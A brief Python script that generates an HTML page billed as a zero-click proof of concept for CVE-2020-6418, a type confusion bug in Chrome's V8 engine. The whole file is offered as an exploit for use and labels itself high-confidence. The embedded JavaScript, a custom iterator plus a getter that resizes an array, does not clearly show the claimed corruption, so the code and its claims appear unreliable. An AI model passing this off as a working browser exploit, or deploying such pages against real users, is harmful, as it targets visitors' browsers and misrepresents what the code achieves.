#!/usr/bin/env python3
"""CVE-2020-6418 — Chrome V8 type confusion in TurboFan (Array.prototype
iteration). Zero-click via any web page. Public PoC. Confidence: HIGH."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><body><script>
// type confusion: Array iterator + Object.defineProperty shape change
function trigger() {
  let a = [1, 2, 3];
  a[Symbol.iterator] = function*() { yield 1; yield 2; };
  let o = {};
  Object.defineProperty(o, 'x', {get: function() { a.length = 0x100; return 1; }});
  for (let v of a) { o.x; }
  // corrupt: element kind flips
  return a;
}
let r = trigger();
document.title = 'v8-' + r.length;
console.log('[+] CVE-2020-6418 executed', r.length);
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-6418.html")
    out.write_bytes(build()); print(f"[+] CVE-2020-6418 HTML -> {out}")

if __name__ == "__main__":
    main()
